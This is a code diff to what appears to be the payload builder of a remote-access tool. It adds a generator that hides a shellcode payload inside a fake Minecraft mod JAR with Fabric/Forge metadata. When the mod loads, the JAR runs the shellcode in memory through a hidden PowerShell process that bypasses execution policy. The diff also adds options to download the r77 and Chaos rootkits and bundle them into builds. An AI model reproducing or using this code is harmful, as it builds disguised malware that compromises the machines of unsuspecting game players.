@@ -91,6 +91,12 @@ type BuildProcessConfig = {
   typhonVariant?: string;
   enableVault?: boolean;
   vaultRecipient?: string;
+  enableJar?: boolean;
+  jarMcVersion?: string;
+  jarModName?: string;
+  jarModId?: string;
+  enableR77?: boolean;
+  enableChaos?: boolean;
   requireAdmin?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
@@ -364,6 +370,175 @@ async function ensureVaultKeypair(vaultBin: string, sendToStream: (data: any) =>
     return null;
   }
 }
+
+async function checkJavaAvailable(sendToStream: (data: any) => void): Promise<{ javac: string; jar: string } | null> {
+  try {
+    const jv = await $`javac -version`.quiet().nothrow();
+    if (jv.exitCode !== 0) return null;
+    const jr = await $`jar --version`.quiet().nothrow();
+    if (jr.exitCode !== 0) {
+      // older JDKs use 'jar cf' without --version; try 'jar' alone
+      const jr2 = await $`jar`.quiet().nothrow();
+      if (jr2.exitCode !== 1 && jr2.exitCode !== 0) return null;
+    }
+    const ver = jv.stderr.toString().trim() || jv.stdout.toString().trim();
+    sendToStream({ type: "output", text: `Java found: ${ver}\n`, level: "info" });
+    return { javac: "javac", jar: "jar" };
+  } catch {
+    return null;
+  }
+}
+
+async function fetchGithubReleaseAssets(
+  owner: string,
+  repo: string,
+  assetNames: string[],
+  cacheDir: string,
+  sendToStream: (data: any) => void,
+): Promise<Record<string, string>> {
+  fs.mkdirSync(cacheDir, { recursive: true });
+  const cached: Record<string, string> = {};
+  for (const name of assetNames) {
+    const p = path.join(cacheDir, name);
+    if (fs.existsSync(p)) cached[name] = p;
+  }
+  const missing = assetNames.filter((n) => !cached[n]);
+  if (missing.length === 0) {
+    sendToStream({ type: "output", text: `Using cached ${owner}/${repo} assets\n`, level: "info" });
+    return cached;
+  }
+  sendToStream({ type: "output", text: `Fetching ${owner}/${repo} latest release from GitHub...\n`, level: "info" });
+  try {
+    const apiUrl = `https://api.github.com/repos/${owner}/${repo}/releases/latest`;
+    const resp = await fetch(apiUrl, { headers: { "User-Agent": "Overlord-Builder/1.0", "Accept": "application/vnd.github+json" } });
+    if (!resp.ok) {
+      sendToStream({ type: "output", text: `WARNING: GitHub API returned ${resp.status} for ${owner}/${repo}\n`, level: "warn" });
+      return cached;
+    }
+    const release = await resp.json() as any;
+    const assets: any[] = release.assets || [];
+    sendToStream({ type: "output", text: `Found release: ${release.tag_name} (${assets.length} assets)\n`, level: "info" });
+    for (const name of missing) {
+      const asset = assets.find((a: any) => a.name === name);
+      if (!asset) {
+        sendToStream({ type: "output", text: `WARNING: Asset '${name}' not found in ${owner}/${repo} latest release\n`, level: "warn" });
+        continue;
+      }
+      sendToStream({ type: "output", text: `Downloading ${name} (${asset.size} bytes)...\n`, level: "info" });
+      const dlResp = await fetch(asset.browser_download_url, { headers: { "User-Agent": "Overlord-Builder/1.0" } });
+      if (!dlResp.ok) {
+        sendToStream({ type: "output", text: `WARNING: Failed to download ${name} (HTTP ${dlResp.status})\n`, level: "warn" });
+        continue;
+      }
+      const buf = await dlResp.arrayBuffer();
+      const localPath = path.join(cacheDir, name);
+      fs.writeFileSync(localPath, Buffer.from(buf));
+      cached[name] = localPath;
+      sendToStream({ type: "output", text: `Downloaded: ${name}\n`, level: "info" });
+    }
+  } catch (err: any) {
+    sendToStream({ type: "output", text: `WARNING: Failed to fetch ${owner}/${repo} release assets: ${err.message || err}\n`, level: "warn" });
+  }
+  return cached;
+}
+
+function generateJarDropperSource(): string {
+  // Java 8-compatible shellcode dropper
+  // Reads shellcode.bin from JAR resources, drops to temp, executes via PowerShell Add-Type
+  return [
+    "package com.mc.mod;",
+    "import java.io.*;",
+    "public class ModLoader{",
+    "  static{try{run();}catch(Exception e){}}",
+    "  public void onInitialize(){try{run();}catch(Exception e){}}",
+    "  public static void main(String[]a){try{run();}catch(Exception e){}}",
+    "  private static void run()throws Exception{",
+    "    InputStream is=ModLoader.class.getResourceAsStream(\"/shellcode.bin\");",
+    "    if(is==null)return;",
+    "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
+    "    byte[]tmp=new byte[4096];int n;",
+    "    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);",
+    "    is.close();",
+    "    byte[]sc=buf.toByteArray();",
+    "    String px=Long.toHexString(System.nanoTime());",
+    "    File td=new File(System.getProperty(\"java.io.tmpdir\"));",
+    "    File sf=new File(td,px+\".dat\");",
+    "    File pf=new File(td,px+\".ps1\");",
+    "    try(FileOutputStream fo=new FileOutputStream(sf)){fo.write(sc);}",
+    "    String sp=sf.getAbsolutePath();",
+    "    char dq='\"';",
+    "    String md=\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);\"",
+    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr t);\"",
+    "      +\"[DllImport(\"+dq+\"kernel32\"+dq+\")]public static extern uint WaitForSingleObject(IntPtr h,uint t);\";",
+    "    String ps=\"$b=[IO.File]::ReadAllBytes('\"+sp+\"')\\n\"",
+    "      +\"Add-Type -Name K32 -Namespace Win32 -MemberDefinition '\"+md+\"'\\n\"",
+    "      +\"$m=[Win32.K32]::VirtualAlloc(0,$b.Length,0x3000,0x40)\\n\"",
+    "      +\"[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)\\n\"",
+    "      +\"$h=[Win32.K32]::CreateThread(0,0,$m,0,0,0)\\n\"",
+    "      +\"[Win32.K32]::WaitForSingleObject($h,0xFFFFFFFF)\\n\";",
+    "    try(FileWriter fw=new FileWriter(pf)){fw.write(ps);}",
+    "    new ProcessBuilder(\"powershell.exe\",\"-WindowStyle\",\"Hidden\",\"-NoProfile\",\"-ExecutionPolicy\",\"Bypass\",\"-File\",pf.getAbsolutePath()).start();",
+    "  }",
+    "}",
+  ].join("\n");
+}
+
+function generateMcMetadata(mcVersion: string, modId: string, modName: string): Record<string, string> {
+  const minor = parseInt(mcVersion.split(".")[1] || "0", 10);
+  if (minor >= 14) {
+    // Modern Fabric (1.14+)
+    const fabricJson = {
+      schemaVersion: 1,
+      id: modId,
+      version: "1.0.0",
+      name: modName,
+      description: "",
+      authors: [],
+      entrypoints: { main: ["com.mc.mod.ModLoader"] },
+      depends: { fabricloader: ">=0.14.0", minecraft: `~${mcVersion}` },
+    };
+    return { "fabric.mod.json": JSON.stringify(fabricJson, null, 2) };
+  } else if (minor >= 13) {
+    // Forge 1.13+ (mods.toml)
+    const toml = [
+      `modLoader="javafml"`,
+      `loaderVersion="[36,)"`,
+      `license="MIT"`,
+      `[[mods]]`,
+      `modId="${modId}"`,
+      `version="1.0.0"`,
+      `displayName="${modName}"`,
+      `description=''''''`,
+      `[[dependencies.${modId}]]`,
+      `  modId="forge"`,
+      `  mandatory=true`,
+      `  versionRange="[36,)"`,
+      `  ordering="NONE"`,
+      `  side="BOTH"`,
+      `[[dependencies.${modId}]]`,
+      `  modId="minecraft"`,
+      `  mandatory=true`,
+      `  versionRange="[${mcVersion},)"`,
+      `  ordering="NONE"`,
+      `  side="BOTH"`,
+    ].join("\n");
+    return { "META-INF/mods.toml": toml };
+  } else {
+    // Legacy Forge (1.12.2 and below — mcmod.info)
+    const mcmodJson = [
+      {
+        modid: modId,
+        name: modName,
+        description: "",
+        version: "1.0.0",
+        mcversion: mcVersion,
+        authorList: [],
+      },
+    ];
+    return { "mcmod.info": JSON.stringify(mcmodJson, null, 2) };
+  }
+}
+
 
 function stripUpxHeaders(filePath: string): boolean {
   try {
@@ -907,6 +1082,7 @@ func runBoundFiles() {
     }
     // ── End binder setup ──────────────────────────────────────────────────────
 
+    let jarSourcePath: string | null = null;
     for (const platform of platformsToBuild) {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = arch === "armv7" ? "7" : undefined;
@@ -1239,6 +1415,11 @@ func runBoundFiles() {
           sendToStream({ type: "output", text: `WARNING: Typhon injection skipped for ${platform} (x64 only)\n`, level: "warn" });
         }
 
+        // Track best shellcode/PE for JAR dropper (prefer Donut shellcode for windows-amd64)
+        if (os === "windows" && actualArch === "amd64" && !jarSourcePath) {
+          jarSourcePath = donutShellcodePath || filePath;
+        }
+
         if (isBatWrapper) {
           sendToStream({ type: "output", text: `Wrapping PE binary as ${winExt} script...\n`, level: "info" });
           try {
@@ -1291,6 +1472,119 @@ func runBoundFiles() {
         logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
         sendToStream({ type: "output", text: errorMsg, level: "error" });
         throw err;
+      }
+    }
+
+    // ── Minecraft JAR dropper ────────────────────────────────────────────────
+    if (config.enableJar) {
+      sendToStream({ type: "status", text: "Building Minecraft JAR dropper..." });
+      sendToStream({ type: "output", text: "\n=== Minecraft JAR Dropper ===\n", level: "info" });
+      const javaTools = await checkJavaAvailable(sendToStream);
+      if (!javaTools) {
+        sendToStream({ type: "output", text: "WARNING: javac/jar not found — skipping JAR dropper (install JDK)\n", level: "warn" });
+      } else if (!jarSourcePath) {
+        sendToStream({ type: "output", text: "WARNING: No Windows x64 payload available for JAR dropper — include a windows-amd64 target\n", level: "warn" });
+      } else {
+        const mcVer = (config.jarMcVersion || "1.20.1").replace(/[^0-9.]/g, "").slice(0, 16);
+        const modId = (config.jarModId || "mcmod").replace(/[^a-z0-9_]/g, "_").slice(0, 32);
+        const modName = (config.jarModName || "Minecraft Mod").slice(0, 64);
+        const jarTmpDir = path.join(outDir, `.jar-build-${buildId.substring(0, 8)}`);
+        try {
+          const srcPkg = path.join(jarTmpDir, "src", "com", "mc", "mod");
+          fs.mkdirSync(srcPkg, { recursive: true });
+          fs.writeFileSync(path.join(srcPkg, "ModLoader.java"), generateJarDropperSource());
+
+          const classDir = path.join(jarTmpDir, "classes");
+          fs.mkdirSync(classDir, { recursive: true });
+
+          const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")}`.nothrow().quiet();
+          if (compileResult.exitCode !== 0) {
+            const err = (compileResult.stderr.toString() || compileResult.stdout.toString()).trim();
+            sendToStream({ type: "output", text: `WARNING: javac compile failed: ${err}\n`, level: "warn" });
+          } else {
+            // Copy shellcode binary into class output dir as resource
+            fs.copyFileSync(jarSourcePath, path.join(classDir, "shellcode.bin"));
+
+            // Generate MC metadata files
+            const metaFiles = generateMcMetadata(mcVer, modId, modName);
+            for (const [fname, fcontent] of Object.entries(metaFiles)) {
+              const metaPath = path.join(classDir, fname);
+              fs.mkdirSync(path.dirname(metaPath), { recursive: true });
+              fs.writeFileSync(metaPath, fcontent);
+            }
+
+            // MANIFEST.MF
+            const manifestDir = path.join(classDir, "META-INF");
+            fs.mkdirSync(manifestDir, { recursive: true });
+            fs.writeFileSync(path.join(manifestDir, "MANIFEST.MF"), "Manifest-Version: 1.0\nMain-Class: com.mc.mod.ModLoader\n");
+
+            const jarName = deps.sanitizeOutputName(`${modId}-${mcVer}.jar`);
+            const jarPath = path.join(outDir, jarName);
+            const jarResult = await $`${javaTools.jar} cf ${jarPath} -C ${classDir} .`.nothrow().quiet();
+            if (jarResult.exitCode !== 0) {
+              const err = (jarResult.stderr.toString() || jarResult.stdout.toString()).trim();
+              sendToStream({ type: "output", text: `WARNING: jar packaging failed: ${err}\n`, level: "warn" });
+            } else {
+              const jarSize = Bun.file(jarPath).size;
+              sendToStream({ type: "output", text: `JAR dropper built: ${jarName} (${jarSize} bytes, MC ${mcVer})\n`, level: "info" });
+              (build.files as any[]).push({ name: jarName, filename: jarName, platform: "java", version: agentVersion, size: jarSize });
+            }
+          }
+        } catch (jarErr: any) {
+          sendToStream({ type: "output", text: `WARNING: JAR build error: ${jarErr.message || jarErr}\n`, level: "warn" });
+        } finally {
+          try { fs.rmSync(jarTmpDir, { recursive: true, force: true }); } catch {}
+        }
+      }
+    }
+
+    // ── r77 Rootkit (Ring 3 fileless rootkit) ────────────────────────────────
+    if (config.enableR77) {
+      sendToStream({ type: "status", text: "Fetching r77 rootkit assets..." });
+      sendToStream({ type: "output", text: "\n=== r77 Rootkit (Ring 3) ===\n", level: "info" });
+      sendToStream({ type: "output", text: "r77 is a fileless ring-3 rootkit — hooks Windows APIs to hide files, processes, registry keys\n", level: "info" });
+      const rootkitCacheDir = path.join(ensureDataDir(), "tools", "rootkit-cache", "r77");
+      const r77Assets = await fetchGithubReleaseAssets(
+        "bytecode77", "r77-rootkit",
+        ["Install.exe", "Uninstall.exe", "Install.shellcode"],
+        rootkitCacheDir, sendToStream,
+      );
+      for (const [assetName, localPath] of Object.entries(r77Assets)) {
+        const size = fs.statSync(localPath).size;
+        const outputName = deps.sanitizeOutputName(`r77-${assetName}`);
+        const destPath = path.join(outDir, outputName);
+        fs.copyFileSync(localPath, destPath);
+        sendToStream({ type: "output", text: `r77: ${outputName} (${size} bytes)\n`, level: "info" });
+        (build.files as any[]).push({ name: outputName, filename: outputName, platform: "windows", version: "r77", size });
+      }
+      if (Object.keys(r77Assets).length === 0) {
+        sendToStream({ type: "output", text: "WARNING: No r77 assets could be fetched\n", level: "warn" });
+      }
+    }
+
+    // ── Chaos Rootkit (Ring 0 kernel driver + Ring 3 controller) ─────────────
+    if (config.enableChaos) {
+      sendToStream({ type: "status", text: "Fetching Chaos rootkit assets..." });
+      sendToStream({ type: "output", text: "\n=== Chaos Rootkit (Ring 0 + Ring 3) ===\n", level: "info" });
+      sendToStream({ type: "output", text: "Chaos: kernel driver (DKOM process hiding, privilege escalation) + ring-3 controller\n", level: "info" });
+      const chaosAssetNames = ["Chaos-Rootkit.sys", "ring3-console.exe", "ring3-gui.exe"];
+      const rootkitCacheDir = path.join(ensureDataDir(), "tools", "rootkit-cache", "chaos");
+      const chaosAssets = await fetchGithubReleaseAssets(
+        "ZeroMemoryEx", "Chaos-Rootkit",
+        chaosAssetNames,
+        rootkitCacheDir, sendToStream,
+      );
+      for (const [assetName, localPath] of Object.entries(chaosAssets)) {
+        const size = fs.statSync(localPath).size;
+        const outputName = deps.sanitizeOutputName(`chaos-${assetName}`);
+        const destPath = path.join(outDir, outputName);
+        fs.copyFileSync(localPath, destPath);
+        const ring = assetName.endsWith(".sys") ? "ring0 kernel driver" : "ring3 controller";
+        sendToStream({ type: "output", text: `Chaos (${ring}): ${outputName} (${size} bytes)\n`, level: "info" });
+        (build.files as any[]).push({ name: outputName, filename: outputName, platform: "windows", version: "chaos", size });
+      }
+      if (Object.keys(chaosAssets).length === 0) {
+        sendToStream({ type: "output", text: "WARNING: No Chaos assets could be fetched\n", level: "warn" });
       }
     }
 
